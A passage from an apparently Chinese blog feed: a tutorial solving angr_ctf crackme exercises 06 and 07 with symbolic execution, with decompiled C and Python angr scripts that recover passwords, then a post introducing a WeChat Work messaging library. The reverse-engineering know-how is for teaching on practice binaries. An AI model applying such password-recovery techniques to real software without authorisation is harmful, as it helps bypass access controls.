class="line-numbers language-c" data-language="c"><code class="language-c">buffer0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>buffer1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">9u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>上面是<code>molloc</code>函数为<code>buffer</code>动态分配地址的代码， 由于不被执行，因此我们需要手动地给<code>buffer0,buffer1</code>指向一个地址（虚拟地址），相当于模拟了<code>molloc</code>的操作，检查<code>ida</code>中<code>buffer0, buffer1</code>的地址如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210503105221.png" alt=""></p><p>这两个地址是<code>buffer0, buffer1</code>本身被存放的内存地址，我们需要让他们存储的内容是我们提供的虚拟地址，可以通过<code>memory.store(add,data)</code>的方式往这两个指定内存地址写入我们的虚拟地址。</p><blockquote><p>这部分可能有点混乱，我们可以思考一下正常程序执行时候的地址指向：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">buffer0 <span class="token operator">-></span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>分配地址 <span class="token operator">-></span> string0buffer1 <span class="token operator">-></span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>分配地址 <span class="token operator">-></span> string1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>由于angr模拟执行的时候没有<code>molloc</code>分配的环节，即 $buffer\to \cancel{malloc} -&gt; string$ ，因此我们需要在<code>buffer</code>真实存储的位置填写一个<code>fake_addr</code>(任意，只要不被使用即可)，并让其指向<code>string</code>符号变量，如下</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">buffer0 <span class="token operator">-></span> fake_addr <span class="token operator">-></span> string0buffer1 <span class="token operator">-></span> fake_addr <span class="token operator">-></span> string1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></blockquote><p>下面是题解，我会在必要地方添加注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'06_angr_symbolic_dynamic_memeory'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048696</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">8</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># 这里我们提供一个fake_addr（任意不影响现有地址即可），让buffer指向它，模拟malloc操作</span>    fake_heap_address0 <span class="token operator">=</span> <span class="token number">0xffffc93c</span>    pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x09FD92AC</span>   <span class="token comment"># 该地址为buffer0的地址</span>    <span class="token comment">#　angr默认大端，开源直接用project.arch.memory_endness 设置和程序一样</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>    fake_heap_address1 <span class="token operator">=</span> <span class="token number">0xffffc94c</span>    pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x09FD92B4</span>  <span class="token comment"># 该地址为buffer0的地址</span>    <span class="token comment"># 　angr默认大端，开源直接用project.arch.memory_endness 设置和程序一样</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>    <span class="token comment"># 将我们需要的符号变量插入到我们提供的fake_address中，这样在执行的时候就会自动将这部分的变量取出</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># cast_to=bytes 是将原本8字节存储数据按照bytes显示，最后decode转换成普通字符串</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">,</span> solution1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210503111134.png" alt=""></p><h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><p>查看反编译代码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%64s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ignore_me</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"MRXJKZYR.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"MRXJKZYR.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520992</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520992</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token string">"YLYSSSEV"</span><span class="token punctuation">,</span> <span class="token number">9u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序本身的工作很好理解：</p><ol><li>读取用户输入的一个64字节的字符串，将其写入到文件<code>MRXJKZYR.txt</code></li><li>读取文件<code>MRXJKZYR.txt</code>中的数据，对读取的数据进行<code>complex_fucntion</code>变换</li><li>将结果与目标字符串比较是否符合条件</li></ol><p>跟以往几题不同的是，这次不再是直接的终端输入了，而是从文件中读取数据，因此，我们需要模拟一个文件，对文件进行符号化。</p><p>在<code>angr</code>中，对文件系统进行模拟需要通过<code>angr.storage.SimFile(name, content, size)</code>对象，接收三个参数：</p><ul><li><code>name</code>： 要模拟的文件名称</li><li><code>content:Optional</code>：模拟的文件内容，通常传入的是一个<code>BV(bitvector)</code>对象，表示符号化的变量，也可以传入<code>string</code></li><li><code>size:Optional</code>：文件的大小</li></ul><p>当完成文件的模拟后，就像我们生成一个符号变量之后需要将其添加到<code>state</code>中的指定位置（如<strong>寄存器，内存，栈</strong>）一样（将符号化变量添加到初始化状态中），生成的模拟文件也需要添加到指定的<code>state</code>当中，添加的方式有两种：</p><ol><li>利用<code>state.fs.insert(filename, simfile)</code>方法：传入文件名和相应的模拟文件对象(<code>SimFile</code>)，类似于之前<code>state.memory.store(fake_heap_address0, passwd0)</code>这部分操作</li><li>利用<code>state.pofix.fs</code>选项以文件名的字典来预配置<code>SimFile</code></li></ol><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">symbolic_filesystem <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'filename'</span> <span class="token punctuation">:</span> simfile<span class="token punctuation">&#125;</span>state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>fs <span class="token operator">=</span> symbolic_filesystem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p>上面的两部分操作分别对应之前的创建符号变量(<code>BV</code>)和将符号变量插入到指定位置中，可以将前面的题目与这部分相应位置对比帮助自己理解这个过程，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210504122631.png" alt=""></p><p>还有一个重要的地方是起始地址的选择，程序在第一次<code>scanf</code>输入之后，执行<code>ignore_me</code>，我们的符号变量模拟的是此<code>scanf</code>的输入，选择调用<code>scanf</code>结束之后的地址即可。</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210504122151.png" alt=""></p><p>这里我采用了<code>0x80488D3</code></p><p>下面是题解，我在必要的地方添加了注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token comment">#</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">"./07_angr_symbolic_file"</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment"># 起始地址选取</span>    start_address <span class="token operator">=</span> <span class="token number">0x80488D3</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment"># 文件名</span>    filename <span class="token operator">=</span> <span class="token string">'MRXJKZYR.txt'</span>    <span class="token comment">#　输入为64字节,0x40</span>    symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>    <span class="token comment">#　创建BV的时候单位以字节计算，因此要×8</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment"># 模拟文件，将符号变量作为content添加进去</span>    simfile <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token operator">=</span>password0<span class="token punctuation">,</span> size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>    <span class="token comment">#　将模拟文件插入到初始化状态中</span>    initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> simfile<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># cast_to=bytes 是将原本8字节存储数据按照bytes显示，最后decode转换成普通字符串</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;:.8s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210504122312.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要撰写练习了<code>angr_ctf</code>中的前6道题目，这里对他们分别简单总结一下：</p><ul><li><strong>angr_find</strong>：最简单的根据地址查找路径，提供一个想要执行路径相关的地址，解析得到对应的测试用例</li><li><strong>angr_void</strong>：在<code>find</code>的基础上，添加了不希望执行的路径信息（该路径上一个相关地址），在大型程序中能够大大提高执行效率</li><li><strong>angr_find_condition</strong>: 按照条件执行路径，如需要分支输出特定的结果才去执行，这避免了找一堆执行路径相关地址的麻烦</li><li><strong>angr_symbolic_registers</strong>: 将angr符号变量直接写入寄存器中，此时不再需要从程序入口点<code>main</code>进入，可以跳过许多不相关的代码，后面的几题基本也是围绕输入数据存储在哪，如何直接“空降”到指定位置，并让程序正常模拟执行。</li><li><strong>angr_symbolic_stack</strong>: 输入结果不再保存到寄存器，而是存储到栈中，需要添加对栈的操作，手动将符号变量压入栈</li><li><strong>angr_symbolic_memory</strong>: 直接修改内存中保存的内容，学习<code>memory.store()</code>的使用</li><li><p><strong>angr_symbolic_dynamic_memory</strong>: 模拟<code>malloc</code>动态分配内存地址，提供<code>fake_address</code>（替代<code>malloc</code>分配地址空间）</p></li><li><p><strong>angr_symbolic_file</strong>：使用<code>angr</code>的模拟文件系统，实现对文件数据的符号化</p></li></ul><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/blob/master/笔记/01/Angr_CTF从入门到精通（一）.md">AngrCTF_FITM/Angr_CTF从入门到精通（一）.md at master · ZERO-A-ONE/AngrCTF_FITM (github.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://github.com/lcatro/Angr-CTF-Learn-Note">lcatro/Angr-CTF-Learn-Note: The learn note of Angr-CTF .. (github.com)</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>static_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【corpwechat-bot】一个好用的企业微信消息推送python接口库</title>
    <link href="/article/22468.html"/>
    <url>/article/22468.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>corpwechat-bot</code>是一个<code>python</code>封装的企业机器人&amp;应用消息推送库，通过企业微信提供的api实现。</p><p>利用本库，你可以轻松地实现从服务器端发送一条文本、图片、视频、<code>markdown</code>等等消息到你的微信手机端，而不依赖于其他的第三方应用，如<code>ServerChan</code>。</p><h2 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h2><blockquote><p><strong>注意</strong>，本项目依赖于企业微信创建群聊机器人或应用，要想实现需要先注册一个属于你自己的企业微信号，这十分简便，参照<a href="https://work.weixin.qq.com/">官方网址</a>即可</p></blockquote><p>当你有了企业微信后，你还需要做一些配置，根据你自身的需求来做选择：</p><ul><li><strong>应用消息推送</strong> ：应用消息推送需要在企业微信中创建一个第三方应用，<a href="https://open.work.weixin.qq.com/wwopen/helpguide/detail?t=selfBuildApp">参照教程</a></li><li><strong>群聊机器人消息推送</strong>：群聊机器人消息推送需要在你已有的企业群中添加一个机器人，然后获取相应的机器人<code>key</code>，<a href="https://jingyan.baidu.com/article/d45ad148cc79eb28552b80b5.html">参照教程</a></li></ul><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>下面是部分项目演示效果：</p><ul><li><strong>应用消息推送</strong><br><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210409154040.png" alt="image-20210409154040566"></li><li><strong>群聊机器人消息推送</strong><br><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210409154014.png" alt="img_2.png"></li></ul><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><p>目前实现了两种推送消息方式，<strong>应用消息推送</strong>和<strong>群聊机器人消息推送</strong>，具体效果参考<a href="docs/usage.md">使用教程</a></p><ul><li><p><strong>应用消息推送</strong>：该推送会直接传至你的个人微信上，你会像收到好友消息一样收到通知信息，<strong>不需要安装企业微信</strong>，具体包括：</p><div>            <input type="checkbox" disabled checked="checked">文本消息: 最普通的消息，文字内容，最长不超过2048个字节          </div><div>            <input type="checkbox" disabled checked="checked">图片消息：发送一张图片，可选jpg，png          </div><div>            <input type="checkbox" disabled checked="checked">语音消息：发送一条语音，大小不超过2MB，时长不超过60s，必须是.amr格式          </div><div>            <input type="checkbox" disabled checked="checked">视频消息：发送一段视频，大小不超过10MB，必须是.mp4格式          </div><div>            <input type="checkbox" disabled checked="checked">普通文件：其他类型的文件，大小不超过20MB（不小于5字节）          </div><div>            <input type="checkbox" disabled checked="checked">markdown消息：传输markdown类型消息          </div><div>            <input type="checkbox" disabled checked="checked">图文消息：图片文字形式，带有跳转链接，适合做推广          </div><div>            <input type="checkbox" disabled checked="checked">文本卡片消息：以卡片形式呈现的文本，包含跳转链接          </div><div>            <input type="checkbox" disabled >小程序通知消息：应用需绑定小程序才可使用，尚未实现          </div><div>            <input type="checkbox" disabled >任务卡片消息：允许用户点击做出相应反馈的卡片，需绑定回调函数，尚未实现          </div></li></ul><ul><li><p><strong>群聊机器人消息推送</strong>：该推送仅会发送消息到企业微信群聊中，经测试，个人微信的企业群聊不会收到机器人发送的消息，因此要收到消息<strong>需安装企业微信</strong>，具体包括：</p><div>            <input type="checkbox" disabled checked="checked">文本消息：普通文字消息，最长不超过2048个字节          </div><div>            <input type="checkbox" disabled checked="checked">图片消息：图片大小不超过2M          </div><div>            <input type="checkbox" disabled checked="checked">图文消息：图片文字形式，带有跳转链接，适合打广告          </div><div>            <input type="checkbox" disabled checked="checked">文件消息：发送单个文件到群聊，大小在5B~20MB之间          </div></li></ul><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>本项目已开源在github，地址：<a href="https://github.com/GentleCP/corpwechat-bot">https://github.com/GentleCP/corpwechat-bot</a> , 更多使用方法参考github，欢迎提交PR和star :)</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>corpwechat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据类创建与使用</title>
    <link href="/article/23726.html"/>
    <url>/article/23726.html</url>
    
